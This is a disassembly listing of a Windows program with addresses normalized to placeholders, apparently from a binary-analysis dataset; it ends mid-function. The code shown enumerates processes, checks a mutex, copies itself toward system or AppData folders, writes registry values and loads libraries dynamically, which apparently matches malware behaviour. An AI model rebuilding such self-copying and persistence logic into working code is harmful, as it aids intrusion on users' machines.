sub_401000
sub esp 0x128
push ebx
push esi
push edi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x128
retn
lea eax [ esp + 0xc ]
mov [ esp + 0xc ] 0x128
push eax
push ebx
call Process32First
test eax eax
je r-xdata
push ebx
call [ CloseHandle@IAT ]
mov esi [ esp + 0x138 ]
or ecx 0xffffffff
mov edi esi
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x34 ]
push esi
push ecx
call sub_403420
add esp 0xc
test eax eax
je r-xdata
push ebx
call [ CloseHandle@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x128
retn
lea edx [ esp + 0xc ]
push edx
push ebx
call Process32Next
test eax eax
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x30 ]
push ecx
push esi
push eax
call sub_403420
add esp 0xc
test eax eax
jne r-xdata
sub_4010b0
sub esp 0x160
push ebx
push ebp
push edi
xor ebx ebx
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x69 ]
mov [ esp + 0x68 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x24 ]
push rw-data
[ edi ]
mov [ esp + 0x18 ] eax
lea ecx [ esp + 0x6c ]
mov [ esp + 0x1c ] eax
push ecx
mov [ esp + 0x24 ] eax
mov [ esp + 0x14 ] ebx
mov [ esp + 0x2c ] 0x44
mov [ esp + 0x58 ] 0x1
mov [ esp + 0x5c ] bx
mov [ esp + 0x28 ] eax
call sub_409240
mov ebp [ GetTickCount@IAT ]
add esp 0x8
call ebp
mov [ esp + 0x10 ] eax
lea edx [ esp + 0x14 ]
lea eax [ esp + 0x24 ]
push edx
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
lea ecx [ esp + 0x84 ]
push ebx
push ecx
push ebx
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
mov edi [ Sleep@IAT ]
push esi
mov esi [ GetExitCodeProcess@IAT ]
mov ebx 0x103
pop edi
pop ebp
pop ebx
add esp 0x160
retn
call ebp
mov esi [ esp + 0x14 ]
mov ecx 0x2710
sub eax esi
pop esi
cmp ecx eax
pop edi
sbb eax eax
pop ebp
neg eax
pop ebx
add esp 0x160
retn
push 0x1f4
call edi
jmp r-xdata
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x10 ]
push edx
push eax
call esi
cmp [ esp + 0x10 ] ebx
jne r-xdata
sub_4011d0
sub esp 0x7e8
push ebx
push ebp
push esi
push edi
mov ecx 0x7f
xor eax eax
lea edi [ esp + 0x5f9 ]
mov [ esp + 0x5f8 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x139 ]
mov [ esp + 0x138 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x7
xor eax eax
lea edi [ esp + 0x39 ]
mov [ esp + 0x38 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x2f9 ]
mov [ esp + 0x2f8 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x138 ]
push rw-data
push eax
mov [ esp + 0x18 ] 0x0
call sub_409240
add esp 0x8
lea ecx [ esp + 0x138 ]
push ecx
push 0x0
push 0x1f0001
call [ OpenMutexA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x138 ]
push rw-data
push edx
call sub_409240
lea eax [ esp + 0x140 ]
push eax
call sub_4011a0
add esp 0xc
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x7e8
retn 0x10
call sub_401740
call sub_40c0d0
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x7e8
retn 0x10
call sub_40c140
test eax eax
jne r-xdata
call sub_409610
mov ebp eax
call sub_4024e0
lea ecx [ esp + 0x3f8 ]
push 0x100
push ecx
push 0x0
mov [ esp + 0x20 ] eax
call [ GetModuleFileNameA@IAT ]
lea edx [ esp + 0x3f8 ]
push edx
call sub_4093c0
mov edi eax
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x58 ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x58 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
sub edx 0x4
[ edi ] [ esi ]
lea edi [ esp + 0x58 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x58 ]
mov [ ecx + edx ] al
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x3f8 ]
sub edx ecx
lea edi [ esp + 0x3f8 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
test ebp ebp
mov [ edx + ecx - 0x1 ] al
je r-xdata
push 0x0
lea ecx [ esp + 0x4fc ]
push 0x1a
push ecx
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
lea eax [ esp + 0x4f8 ]
push 0x100
push eax
call [ GetSystemDirectoryA@IAT ]
jmp r-xdata
lea ecx [ esp + 0x4f8 ]
lea edx [ esp + 0x3f8 ]
push ecx
push edx
call sub_4035e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x5f8 ]
lea eax [ esp + 0x58 ]
push edx
push eax
push 0x0
call sub_401c40
add esp 0xc
test eax eax
jne r-xdata
push rw-data
lea eax [ esp + 0x5fc ]
push 0x0
push eax
push ebp
call sub_40af90
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea ecx [ esi + 0x60 ]
lea edx [ esp + 0x98 ]
push ecx
push edx
call sub_4091f0
add esp 0x8
lea eax [ esp + 0x98 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
lea ecx [ esp + 0x18 ]
push esi
push ecx
call sub_4091f0
lea edx [ esi + 0x20 ]
lea eax [ esp + 0x40 ]
push edx
push eax
call sub_4091f0
lea ecx [ esi + 0xe0 ]
lea edx [ esp + 0x608 ]
push ecx
push edx
call sub_4091f0
lea eax [ esp + 0x250 ]
push rw-data
push eax
call sub_409240
lea ecx [ esp + 0x58 ]
lea edx [ esp + 0xb8 ]
push ecx
push edx
lea eax [ esp + 0x320 ]
push rw-data
push eax
call sub_403581
lea ecx [ esp + 0x2a8 ]
push rw-data
push ecx
call sub_409240
lea edi [ esi + 0x160 ]
lea edx [ esp + 0x170 ]
push edi
push edx
call sub_4091f0
add esp 0x40
lea eax [ esp + 0x138 ]
lea ecx [ esp + 0x38 ]
lea edx [ esp + 0x18 ]
push eax
push ecx
lea eax [ esp + 0xa0 ]
push edx
push eax
push 0x0
call sub_40ba10
lea ecx [ esp + 0x2c ]
lea edx [ esp + 0xac ]
mov ebx eax
push ecx
push edx
lea eax [ esp + 0x154 ]
push rw-data
push eax
call sub_403581
lea ecx [ esp + 0x15c ]
push ecx
call sub_409380
add esp 0x28
test eax eax
je r-xdata
test ebp ebp
je r-xdata
lea edx [ esp + 0x2f8 ]
lea eax [ esp + 0x138 ]
push edx
push eax
call sub_403100
lea ecx [ esp + 0x140 ]
push edi
push ecx
call sub_4091f0
lea edx [ esp + 0x148 ]
push edx
call sub_40cff4
add esp 0x14
test ebx ebx
jge r-xdata
lea eax [ esi + 0x40 ]
lea ecx [ esp + 0x118 ]
push eax
push ecx
call sub_4091f0
add esp 0x8
test ebx ebx
jge r-xdata
lea edx [ esp + 0x278 ]
lea eax [ esp + 0x2f8 ]
push edx
lea ecx [ esp + 0x23c ]
push eax
push ecx
call sub_402750
add esp 0xc
test eax eax
jge r-xdata
push esi
call sub_40b5c0
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x7e8
retn 0x10
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x98 ]
push ecx
push edx
lea eax [ esp + 0x140 ]
push rw-data
push eax
call sub_403581
mov eax [ esp + 0x24 ]
add esp 0x10
test eax eax
jne r-xdata
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x98 ]
push edx
push eax
jmp r-xdata
push esi
call sub_40b5c0
add esp 0x4
call sub_4019c0
lea edx [ esp + 0x18 ]
lea eax [ esp + 0x98 ]
push edx
push eax
call sub_402120
add esp 0x8
lea ecx [ esp + 0x2f8 ]
push ecx
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov ebx [ esp + 0x10 ]
lea ecx [ esp + 0x138 ]
lea edx [ esp + 0x118 ]
push ecx
push edx
call sub_409810
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
call sub_402120
push esi
call sub_40b5c0
add esp 0xc
call sub_4019c0
lea edx [ esp + 0x278 ]
push edx
push edi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
test ebx ebx
je r-xdata
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x98 ]
push ecx
push edx
call sub_402120
lea eax [ esp + 0x280 ]
lea ecx [ esp + 0x300 ]
push eax
lea edx [ esp + 0x244 ]
push ecx
push edx
call sub_402750
add esp 0x14
test eax eax
jge r-xdata
push ebx
call sub_409a40
add esp 0x4
jmp r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x98 ]
push eax
push ecx
push 0x3e8
call [ Sleep@IAT ]
push edi
call [ FreeLibrary@IAT ]
call eax
push ebx
call sub_409a60
push ebx
call sub_409920
add esp 0x8
jmp r-xdata
lea eax [ esp + 0x2f8 ]
push eax
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x278 ]
lea eax [ esp + 0x2f8 ]
push edx
push eax
call sub_402a30
add esp 0x8
test eax eax
jge r-xdata
lea ecx [ esp + 0x278 ]
push ecx
push edi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x3e8
call [ Sleep@IAT ]
push edi
call [ FreeLibrary@IAT ]
call eax
sub_401740
push ebp
mov ebp esp
sub esp 0x84
push ebx
push esi
push edi
nop
jmp r-xdata
push rw-data
lea eax [ ebp - 0x84 ]
push eax
call sub_409240
add esp 0x8
push rw-data
lea ecx [ ebp - 0x84 ]
push ecx
call sub_403660
add esp 0x8
mov [ ebp - 0x4 ] eax
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_409980
add esp 0x4
push rw-data
push 0x0
call sub_403660
add esp 0x8
mov [ ebp - 0x4 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_4019c0
push ebp
mov ebp esp
sub esp 0x84
push ebx
push esi
push edi
nop
jmp r-xdata
push rw-data
lea eax [ ebp - 0x84 ]
push eax
call sub_409240
add esp 0x8
push rw-data
lea ecx [ ebp - 0x84 ]
push ecx
call sub_403660
add esp 0x8
mov [ ebp - 0x4 ] eax
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_4099e0
add esp 0x4
push rw-data
push 0x0
call sub_403660
add esp 0x8
mov [ ebp - 0x4 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_401c40
push ebp
mov ebp esp
sub esp 0x248
push ebx
push esi
push edi
nop
jmp r-xdata
mov [ ebp - 0x244 ] 0x0
mov [ ebp - 0x244 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x248 ] eax
cmp [ ebp - 0x248 ] 0x0
je r-xdata
mov ecx [ ebp - 0x244 ]
cmp [ ecx * 4 + rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x248 ] 0x1
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x244 ]
mov eax [ edx * 4 + rw-data ]
push eax
lea ecx [ ebp - 0x200 ]
push ecx
call sub_409240
add esp 0x8
push rw-data
lea edx [ ebp - 0x200 ]
push edx
call sub_403660
add esp 0x8
mov edi eax
lea edx [ ebp - 0x240 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x240 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_408ec0
add esp 0x8
test eax eax
jne r-xdata
mov edx [ ebp - 0x244 ]
cmp [ edx * 4 + rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x248 ] 0x2
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x244 ]
add ecx 0x1
mov [ ebp - 0x244 ] ecx
jmp r-xdata
mov eax [ ebp - 0x244 ]
mov edi [ eax * 4 + rw-data ]
mov edx [ ebp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
xor eax eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x244 ]
mov ecx [ eax * 4 + rw-data ]
push ecx
lea edx [ ebp - 0x200 ]
push edx
call sub_409240
add esp 0x8
push rw-data
lea eax [ ebp - 0x200 ]
push eax
call sub_403660
add esp 0x8
push rw-data
push 0x0
call sub_403660
add esp 0x8
mov edi eax
lea edx [ ebp - 0x240 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x240 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_408ec0
add esp 0x8
test eax eax
jne r-xdata
mov edx [ ebp - 0x244 ]
cmp [ edx * 4 + rw-data ] 0x0
je r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x244 ]
add ecx 0x1
mov [ ebp - 0x244 ] ecx
jmp r-xdata
mov eax [ ebp - 0x244 ]
mov edi [ eax * 4 + rw-data ]
mov edx [ ebp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x244 ]
mov ecx [ eax * 4 + rw-data ]
push ecx
lea edx [ ebp - 0x200 ]
push edx
call sub_409240
add esp 0x8
push rw-data
lea eax [ ebp - 0x200 ]
push eax
call sub_403660
add esp 0x8
mov edi eax
lea edx [ ebp - 0x240 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ ebp - 0x240 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_408ec0
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x244 ]
add ecx 0x1
mov [ ebp - 0x244 ] ecx
jmp r-xdata
mov eax [ ebp - 0x244 ]
mov edi [ eax * 4 + rw-data ]
mov edx [ ebp + 0x10 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
xor eax eax
jmp r-xdata
sub_402120
push ebp
mov ebp esp
sub esp 0x704
push ebx
push esi
push edi
nop
jmp r-xdata
lea eax [ ebp - 0x404 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
push 0x2
call sub_401c40
add esp 0xc
test eax eax
jge r-xdata
lea edx [ ebp - 0x404 ]
push edx
lea eax [ ebp - 0x200 ]
push eax
call sub_409240
add esp 0x8
push rw-data
lea ecx [ ebp - 0x200 ]
push ecx
call sub_403660
add esp 0x8
mov [ ebp - 0x204 ] eax
cmp [ ebp - 0x204 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push rw-data
push 0x0
call sub_403660
add esp 0x8
push eax
push rw-data
lea edx [ ebp - 0x704 ]
push edx
call sub_403581
add esp 0xc
lea eax [ ebp - 0x404 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
push 0x0
call sub_401c40
add esp 0xc
test eax eax
jge r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x404 ]
push edx
lea eax [ ebp - 0x200 ]
push eax
call sub_409240
add esp 0x8
push rw-data
lea ecx [ ebp - 0x200 ]
push ecx
call sub_403660
add esp 0x8
push rw-data
push 0x0
call sub_403660
add esp 0x8
push rw-data
push 0x0
call sub_403660
add esp 0x8
push rw-data
push 0x0
call sub_403660
add esp 0x8
push rw-data
push 0x0
call sub_403660
add esp 0x8
mov edi eax
lea edx [ ebp - 0x704 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push rw-data
lea eax [ ebp - 0x604 ]
push eax
call sub_403581
add esp 0x10
lea ecx [ ebp - 0x604 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x704 ]
push eax
push 0x80000001
call sub_409770
add esp 0x10
push 0x100
lea ecx [ ebp - 0x200 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
lea eax [ ebp - 0x704 ]
push eax
push 0x80000001
call sub_409700
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
sub_4024e0
push ebp
mov ebp esp
sub esp 0x84
push ebx
push esi
push edi
nop
jmp r-xdata
push rw-data
lea eax [ ebp - 0x84 ]
push eax
call sub_409240
add esp 0x8
lea ecx [ ebp - 0x4 ]
push ecx
push 0x20019
push 0x0
lea edx [ ebp - 0x84 ]
push edx
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_402750
push ebp
mov ebp esp
sub esp 0x134
push ebx
push esi
push edi
nop
jmp r-xdata
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x130 ] 0x128
lea eax [ ebp - 0x130 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call Process32First
mov [ ebp - 0x134 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
call [ CloseHandle@IAT ]
lea edx [ ebp - 0x10c ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x8 ]
movsx ecx [ eax ]
mov edx [ ebp + 0x8 ]
movsx eax [ edx ]
cmp ecx eax
jne r-xdata
mov [ ebp - 0x130 ] 0x128
lea edx [ ebp - 0x130 ]
push edx
mov eax [ ebp - 0x4 ]
push eax
call Process32Next
mov [ ebp - 0x134 ] eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x128 ]
push eax
call sub_40ae50
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x134 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
sub_402a30
push ebp
mov ebp esp
sub esp 0x1b4
push ebx
push esi
push edi
nop
jmp r-xdata
push rw-data
lea eax [ ebp - 0x88 ]
push eax
call sub_409240
add esp 0x8
call sub_40c180
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x1b0 ] 0x128
lea ecx [ ebp - 0x1b0 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call Process32First
mov [ ebp - 0x1b4 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x18c ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x88 ]
push ecx
mov edx [ ebp - 0x8 ]
push edx
call sub_408ec0
add esp 0x8
test eax eax
jne r-xdata
mov [ ebp - 0x1b0 ] 0x128
lea ecx [ ebp - 0x1b0 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call Process32Next
mov [ ebp - 0x1b4 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x1a8 ]
push edx
call sub_40ae50
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1b4 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
call [ CloseHandle@IAT ]
xor eax eax
jmp r-xdata
sub_402d30
push ebp
mov ebp esp
sub esp 0x43c
push ebx
push esi
push edi
nop
jmp r-xdata
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0xffffffff
mov [ ebp - 0x2c ] 0x11223344
mov [ ebp - 0x28 ] 0xaaaa
mov [ ebp - 0x24 ] 0x77778888
push rw-data
mov eax [ ebp + 0x8 ]
push eax
call sub_4039c6
add esp 0x8
mov [ ebp - 0x43c ] eax
cmp [ ebp - 0x43c ] 0x0
jne r-xdata
mov [ ebp - 0x20 ] 0x0
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
movsx edx [ ebp - 0x20 ]
cmp edx 0x4
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x43c ]
push ecx
call sub_4038dc
add esp 0xc
mov edx [ ebp - 0x43c ]
push edx
push 0x400
push 0x1
lea eax [ ebp - 0x438 ]
push eax
call sub_4037c5
add esp 0x10
mov [ ebp - 0x34 ] eax
cmp [ ebp - 0x34 ] 0x400
je r-xdata
movsx eax [ ebp - 0x20 ]
mov ecx [ ebp + eax * 4 - 0x30 ]
and ecx 0xff
movsx edx [ ebp - 0x20 ]
mov [ ebp + edx * 4 - 0x18 ] cl
movsx eax [ ebp - 0x20 ]
mov ecx [ ebp + eax * 4 - 0x30 ]
sar ecx 0x8
and ecx 0xff
movsx edx [ ebp - 0x20 ]
mov [ ebp + edx * 4 - 0x17 ] cl
movsx eax [ ebp - 0x20 ]
mov ecx [ ebp + eax * 4 - 0x30 ]
sar ecx 0x10
and ecx 0xff
movsx edx [ ebp - 0x20 ]
mov [ ebp + edx * 4 - 0x16 ] cl
movsx eax [ ebp - 0x20 ]
mov ecx [ ebp + eax * 4 - 0x30 ]
sar ecx 0x18
and ecx 0xff
movsx edx [ ebp - 0x20 ]
mov [ ebp + edx * 4 - 0x15 ] cl
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x43c ]
push ecx
call sub_403748
add esp 0x4
or eax 0xffffffff
jmp r-xdata
mov cx [ ebp - 0x20 ]
add cx 0x1
mov [ ebp - 0x20 ] cx
cmp [ ebp - 0x4 ] 0x3f0
jge r-xdata
cmp [ ebp - 0x4 ] 0x3f0
jge r-xdata
push 0x10
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp + ecx - 0x438 ]
push edx
call sub_403710
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x1c ]
add eax 0x3f0
mov [ ebp - 0x1c ] eax
mov ecx 0x1
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
lea edx [ ecx + eax + 0x10 ]
mov [ ebp - 0x1c ] edx
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x43c ]
push edx
call sub_403748
add esp 0x4
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
sub_403100
push ebp
mov ebp esp
sub esp 0x408
push ebx
push esi
push edi
nop
jmp r-xdata
push rw-data
mov eax [ ebp + 0x8 ]
push eax
call sub_4039c6
add esp 0x8
mov [ ebp - 0x408 ] eax
cmp [ ebp - 0x408 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x408 ]
push ecx
push 0x400
push 0x1
lea edx [ ebp - 0x400 ]
push edx
call sub_4037c5
add esp 0x10
mov eax [ ebp - 0x408 ]
push eax
call sub_403748
add esp 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40cff4
add esp 0x4
mov edx [ ebp + 0xc ]
push edx
call sub_402d30
add esp 0x4
mov [ ebp - 0x404 ] eax
push rw-data
mov eax [ ebp + 0xc ]
push eax
call sub_4039c6
add esp 0x8
mov [ ebp - 0x408 ] eax
cmp [ ebp - 0x408 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov ecx [ ebp - 0x404 ]
push ecx
mov edx [ ebp - 0x408 ]
push edx
call sub_4038dc
add esp 0xc
mov eax [ ebp - 0x408 ]
push eax
push 0x400
push 0x1
lea ecx [ ebp - 0x400 ]
push ecx
call sub_4039d9
add esp 0x10
mov edx [ ebp - 0x408 ]
push edx
call sub_403748
add esp 0x4
mov eax [ ebp + 0xc ]
push eax
push 0x0
call sub_409470
add esp 0x8
mov eax 0x1
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_403420
cmp [ esp + 0xc ] 0x0
push ebx
push ebp
push esi
push edi
je r-xdata
xor eax eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x19
call sub_403c8c
dec [ esp + 0x20 ]
mov ebp [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
pop ecx
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push [ esp + 0x1c ]
call sub_404100
add esp 0xc
jmp r-xdata
movzx edi ax
mov al [ edi + rw-data ]
and al 0x10
cmp al 0x10
jne r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
movzx ax [ ebp ]
movzx ecx al
inc ebp
test [ ecx + rw-data ] 0x4
je r-xdata
movzx di [ edi + rw-data ]
xor ebx ebx
inc edx
mov bh al
mov bl cl
mov edi ebx
cmp di [ rw-data ]
jb r-xdata
xor edi edi
jmp r-xdata
movzx esi ax
mov al [ esi + rw-data ]
and al 0x10
cmp al 0x10
jne r-xdata
mov cl [ ebp ]
test cl cl
jne r-xdata
cmp di [ rw-data ]
jb r-xdata
cmp di [ rw-data ]
ja r-xdata
cmp di si
jne r-xdata
movzx si [ esi + rw-data ]
xor ebx ebx
inc ebp
mov bh al
mov bl cl
mov esi ebx
cmp si [ rw-data ]
jb r-xdata
xor esi esi
jmp r-xdata
cmp di [ rw-data ]
ja r-xdata
add edi [ rw-data ]
jmp r-xdata
push 0x19
call sub_403ced
pop ecx
cmp si di
sbb eax eax
and eax 0x2
dec eax
jmp r-xdata
test di di
je r-xdata
cmp si [ rw-data ]
jb r-xdata
cmp si [ rw-data ]
ja r-xdata
add edi [ rw-data ]
jmp r-xdata
push 0x19
call sub_403ced
pop ecx
mov eax [ esp + 0x1c ]
dec [ esp + 0x1c ]
test eax eax
jne r-xdata
cmp si [ rw-data ]
ja r-xdata
add esi [ rw-data ]
jmp r-xdata
movzx ax [ edx ]
movzx ecx al
inc edx
test [ ecx + rw-data ] 0x4
je r-xdata
add esi [ rw-data ]
jmp r-xdata
sub_403581
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_404319
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_404201
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_4035e0
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp sub_404b46
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
